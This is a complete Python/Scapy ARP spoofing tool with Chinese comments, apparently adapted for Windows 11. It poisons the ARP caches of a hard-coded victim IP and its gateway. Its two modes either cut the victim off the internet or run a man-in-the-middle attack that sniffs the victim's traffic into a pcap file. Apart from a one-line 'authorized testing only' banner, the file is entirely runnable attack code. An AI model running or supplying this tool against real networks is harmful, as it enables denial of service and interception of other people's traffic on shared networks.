#  11 和 15  检查一下有什么不同

import threading
from scapy.all import (ARP, Ether, conf, getmacbyip, send, srp, wrpcap, sniff)
import os
import sys
import time
import platform
import subprocess
import re
import ctypes

def is_admin():
    """检查是否具有管理员权限"""
    try:
        if platform.system() == "Windows":
            return ctypes.windll.shell32.IsUserAnAdmin()
        else:
            return os.getuid() == 0
    except:
        return False

def test_windows_compatibility():
    """测试Windows环境兼容性"""
    print("检查Windows环境兼容性...")

    # 检查管理员权限
    if not is_admin():
        print("❌ 请以管理员身份运行此程序")
        return False

    # 检查Scapy导入
    try:
        from scapy.all import conf
        print("✅ Scapy导入正常")
    except ImportError as e:
        print(f"❌ Scapy未正确安装: {e}")
        print("请运行: pip install scapy")
        return False

    # 检查Npcap驱动
    try:
        if platform.system() == "Windows":
            from scapy.arch.windows import get_windows_if_list
            ifaces = get_windows_if_list()
            if ifaces:
                print(f"✅ Npcap驱动已安装，检测到 {len(ifaces)} 个网络接口")
            else:
                print("❌ 未找到Npcap驱动，请安装最新版Npcap：https://nmap.org/npcap/")
                return False
    except Exception as e:
        print(f"❌ Npcap驱动检测失败: {e}")
        print("请安装最新版Npcap：https://nmap.org/npcap/")
        return False

    return True

def enable_ip_forwarding(enable=True):
    """启用或禁用IP转发 - 跨平台版本"""
    try:
        if platform.system() == "Linux":
            value = "1" if enable else "0"
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write(value)
            cmd = f"sysctl -w net.ipv4.ip_forward={value}"
            subprocess.run(cmd, shell=True, capture_output=True)
            status = "启用" if enable else "禁用"
            print(f"Linux IP转发已{status}")
        elif platform.system() == "Windows":
            # 使用netsh命令替代注册表修改
            cmd = f'netsh interface ip set global enableRouter={1 if enable else 0}'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
            if result.returncode == 0:
                print(f"Windows IP转发已{'启用' if enable else '禁用'}")
            else:
                print(f"❌ 设置IP转发失败，错误信息：{result.stderr}")
                return False
        return True
    except Exception as e:
        print(f"❌ 设置IP转发状态时出错: {e}")
        return False

def get_default_gateway_windows():
    """获取Windows默认网关"""
    try:
        result = subprocess.run(['ipconfig'], capture_output=True, text=True, encoding='utf-8', errors='ignore')
        lines = result.stdout.split('\n')
        for line in lines:
            if 'Default Gateway' in line or '默认网关' in line:
                match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                if match:
                    return match.group(1)
        return None
    except Exception as e:
        print(f"获取默认网关失败: {e}")
        return None

def get_windows_interfaces():
    """获取Windows网络接口详细信息"""
    print("检测Windows网络接口...")
    interfaces = []
    try:
        from scapy.arch.windows import get_windows_if_list
        raw_interfaces = get_windows_if_list()

        for interface in raw_interfaces:
            interface_info = {
                'name': interface['name'],
                'description': interface.get('description', 'N/A'),
                'guid': interface.get('guid', 'N/A'),
                'mac': interface.get('mac', '00:00:00:00:00:00'),
                'ips': interface.get('ips', [])
            }
            interfaces.append(interface_info)

        # 显示接口信息
        for i, interface in enumerate(interfaces):
            print(f"  {i+1}. {interface['name']}")
            print(f"     描述: {interface['description']}")
            print(f"     MAC: {interface['mac']}")
            if interface['ips']:
                print(f"     IP地址: {', '.join(interface['ips'][:2])}")  # 显示前两个IP
            print()

    except Exception as e:
        print(f"获取接口列表失败: {e}")

    return interfaces

def select_windows_interface():
    """让用户选择Windows网络接口"""
    interfaces = get_windows_interfaces()
    if not interfaces:
        print("❌ 未找到可用的网络接口")
        return None

    print("\n请选择网络接口:")
    for i, interface in enumerate(interfaces):
        print(f"{i+1}. {interface['name']} - {interface['description']}")

    try:
        choice = int(input("输入序号 (默认1): ") or 1) - 1
        if 0 <= choice < len(interfaces):
            selected = interfaces[choice]['name']
            print(f"✅ 已选择接口: {selected}")
            return selected
        else:
            print("❌ 无效选择，使用默认接口")
            return interfaces[0]['name']
    except (ValueError, KeyboardInterrupt):
        print("❌ 输入错误，使用默认接口")
        return interfaces[0]['name'] if interfaces else None

def get_victim_mac(targetip, interface=None):
    """获取目标IP的MAC地址"""
    try:
        print(f"正在获取 {targetip} 的MAC地址...")

        # 创建ARP请求数据包
        packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=targetip)

        # Windows需要指定接口
        if interface:
            resp, _ = srp(packet, timeout=3, retry=2, verbose=False, iface=interface)
        else:
            resp, _ = srp(packet, timeout=3, retry=2, verbose=False)

        for _, r in resp:
            mac = r[Ether].src
            print(f"✅ 获取到 {targetip} 的MAC地址: {mac}")
            return mac

        print(f"❌ 无法获取 {targetip} 的MAC地址")
        print("可能的原因:")
        print("  - 目标IP不在线")
        print("  - 选择了错误的网络接口")
        print("  - 防火墙阻止了ARP请求")
        return None
    except Exception as e:
        print(f"❌ 获取 {targetip} 的MAC地址时出错: {e}")
        return None

class Arper:
    def __init__(self, victim, gateway, interface=None, poison_interval=2,
                 packet_count=200, block_internet=True):
        # Windows兼容性测试
        if platform.system() == "Windows" and not test_windows_compatibility():
            sys.exit(1)

        # 检查权限
        if not is_admin():
            print("❌ 错误: 需要管理员权限运行此程序!")
            sys.exit(1)

        self.victim = victim
        self.gateway = gateway
        self.interface = interface
        self.poison_interval = poison_interval
        self.packet_count = packet_count
        self.block_internet = block_internet
        self.original_forward_state = None
        self._running = False
        self.poison_thread = None
        self.sniff_thread = None

        # Windows特定配置
        if platform.system() == "Windows":
            print("🪟 Windows 11 系统检测到，进行特定配置...")

            # 如果未指定接口，让用户选择
            if not self.interface:
                self.interface = select_windows_interface()
                if not self.interface:
                    print("❌ 未选择网络接口，程序退出")
                    sys.exit(1)

            # 如果未指定网关，尝试自动获取
            if not self.gateway:
                self.gateway = get_default_gateway_windows()
                if not self.gateway:
                    print("❌ 无法自动检测网关，请手动指定")
                    sys.exit(1)

        # 配置Scapy
        if self.interface:
            conf.iface = self.interface
        conf.verb = 0

        # 获取MAC地址
        print("🔍 正在获取MAC地址...")
        self.victim_mac = get_victim_mac(self.victim, self.interface)
        self.gateway_mac = get_victim_mac(self.gateway, self.interface)

        if not self.victim_mac or not self.gateway_mac:
            print("❌ 错误: 无法获取必要的MAC地址，请检查:")
            print(f"  - 目标IP: {self.victim} 是否在线")
            print(f"  - 网关IP: {self.gateway} 是否正确")
            print(f"  - 网络接口: {self.interface} 是否有效")
            sys.exit(1)

        print(f'✅ 初始化完成 - 系统: {platform.system()}')
        print(f'🔧 接口: {self.interface}')
        print(f'🌐 网关 ({self.gateway}) MAC: {self.gateway_mac}')
        print(f'🎯 目标 ({self.victim}) MAC: {self.victim_mac}')
        print(f'🚫 断网模式: {"开启" if self.block_internet else "关闭"}')
        print('-' * 50)

        # 设置IP转发状态
        self.setup_ip_forwarding()

    def setup_ip_forwarding(self):
        """设置IP转发状态"""
        try:
            self.original_forward_state = enable_ip_forwarding(not self.block_internet)
        except Exception as e:
            print(f"❌ 设置IP转发状态时出错: {e}")

    def restore_ip_forwarding(self):
        """恢复原始IP转发状态"""
        try:
            if self.original_forward_state is not None:
                enable_ip_forwarding(self.original_forward_state)
                print(f"✅ Windows IP转发已恢复为: {self.original_forward_state}")
        except Exception as e:
            print(f"❌ 恢复IP转发状态时出错: {e}")

    def run(self):
        """启动ARP欺骗和嗅探"""
        try:
            self._running = True

            # 显示当前模式信息
            if self.block_internet:
                print("🚫 断网模式已启用 - 目标主机将无法访问互联网")
            else:
                print("👁️ 中间人模式 - 目标主机可以正常上网，流量被嗅探")
                # 检查IP转发状态
                if not enable_ip_forwarding(enable=True):
                    print("⚠️ 警告: Windows IP转发未启用，中间人模式可能无法正常工作")
                    print("程序将继续运行，但目标可能无法正常上网")

            # 启动毒化线程
            self.poison_thread = threading.Thread(target=self.poison)
            self.poison_thread.daemon = True
            self.poison_thread.start()

            # 只有在中间人模式下才启动嗅探
            if not self.block_internet:
                self.sniff_thread = threading.Thread(target=self.sniff)
                self.sniff_thread.daemon = True
                self.sniff_thread.start()
                print("✅ ARP欺骗和流量嗅探已启动，按 Ctrl+C 停止...")
            else:
                print("✅ ARP断网攻击已启动，按 Ctrl+C 停止...")

            # 主线程等待
            try:
                while self._running:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                self.stop()

        except Exception as e:
            print(f"❌ 运行过程中出错: {e}")
            self.stop()

    def poison(self):
        """持续发送ARP欺骗包"""
        try:
            print("⚡ 开始ARP毒化...")
            print(f"  发送给目标: {self.victim} -> 网关是 {self.gateway}")
            print(f"  发送给网关: {self.gateway} -> 目标在 {self.victim}")
            print(f"  模式: {'断网攻击' if self.block_internet else '中间人攻击'}")
            print('-' * 40)

            while self._running:
                # 构造ARP包
                poison_victim = Ether(dst=self.victim_mac) / ARP(
                    op=2,
                    psrc=self.gateway,
                    pdst=self.victim,
                    hwdst=self.victim_mac
                )

                poison_gateway = Ether(dst=self.gateway_mac) / ARP(
                    op=2,
                    psrc=self.victim,
                    pdst=self.gateway,
                    hwdst=self.gateway_mac
                )

                send(poison_victim, verbose=False, iface=self.interface)
                send(poison_gateway, verbose=False, iface=self.interface)

                # 控制发送间隔
                time.sleep(self.poison_interval)

        except Exception as e:
            print(f"❌ 毒化过程中出错: {e}")

    def sniff(self):
        """嗅探网络流量（仅在中间人模式下使用）"""
        try:
            print(f"⏳ 等待5秒让ARP毒化生效...")
            time.sleep(5)
            print(f'👃 开始嗅探 {self.packet_count} 个数据包...')

            bpf_filter = f"ip host {self.victim}"

            packets = sniff(count=self.packet_count, filter=bpf_filter,
                          iface=self.interface, store=True)

            print(f'✅ 成功捕获 {len(packets)} 个数据包')

            filename = f'arper_{int(time.time())}.pcap'
            wrpcap(filename, packets)
            print(f'💾 数据包已保存到: {filename}')

        except Exception as e:
            print(f"❌ 嗅探过程中出错: {e}")
        finally:
            self.stop()

    def restore(self):
        """恢复ARP表到正常状态"""
        try:
            print('\n⚡ 正在恢复ARP表...')

            # 恢复受害者ARP表
            send(
                Ether(dst=self.victim_mac) /
                ARP(
                    op=2,
                    psrc=self.gateway,
                    hwsrc=self.gateway_mac,
                    pdst=self.victim,
                    hwdst=self.victim_mac
                ),
                count=5,
                verbose=False,
                inter=0.5,
                iface=self.interface
            )

            # 恢复网关ARP表
            send(
                Ether(dst=self.gateway_mac) /
                ARP(
                    op=2,
                    psrc=self.victim,
                    hwsrc=self.victim_mac,
                    pdst=self.gateway,
                    hwdst=self.gateway_mac
                ),
                count=5,
                verbose=False,
                inter=0.5,
                iface=self.interface
            )

            print('✅ ARP表已恢复')
        except Exception as e:
            print(f"❌ 恢复ARP表时出错: {e}")

    def stop(self):
        """安全停止所有线程"""
        print("\n⚡ 正在停止ARP欺骗...")
        self._running = False

        # 等待线程结束
        if self.poison_thread and self.poison_thread.is_alive():
            self.poison_thread.join(timeout=3)
            
        if self.sniff_thread and self.sniff_thread.is_alive():
            self.sniff_thread.join(timeout=3)

        self.restore()
        self.restore_ip_forwarding()

def main():
    """主函数 - 修复后的Windows兼容版本"""
    print("🛠️ ARP欺骗工具 - 仅用于授权测试")
    print(f"💻 系统: {platform.system()} {platform.release()}")
    print("=" * 60)

    # 配置参数
    VICTIM_IP = "172.21.81.216"      # 修改为目标IP
    GATEWAY_IP = "172.21.81.254"     # 修改为网关IP

    # 选择攻击模式
    print("\n🎯 请选择攻击模式:")
    print("1. 断网攻击 (目标无法上网)")
    print("2. 中间人攻击 (目标可以上网，流量被嗅探)")
    choice = input("请输入选择 (1 或 2, 默认1): ").strip() or "1"

    if choice not in ["1", "2"]:
        print("⚠️ 无效选择，使用默认模式: 断网攻击")
        choice = "1"

    BLOCK_INTERNET = choice == "1"

    # 选择网络接口
    if platform.system() == "Windows":
        INTERFACE = select_windows_interface()
        if not INTERFACE:
            return
    else:
        INTERFACE = None

    # 创建ARP实例
    arper = Arper(
        victim=VICTIM_IP,
        gateway=GATEWAY_IP,
        interface=INTERFACE,
        block_internet=BLOCK_INTERNET
    )

    # 启动攻击
    try:
        arper.run()
    except Exception as e:
        print(f"❌ 运行过程中出错: {e}")
        arper.stop()
    finally:
        print("👋 程序退出")

if __name__ == '__main__':
    # 确保程序以管理员身份运行
    if not is_admin():
        print("❌ 请以管理员身份运行此程序")
        sys.exit(1)

    # 运行主函数
    main()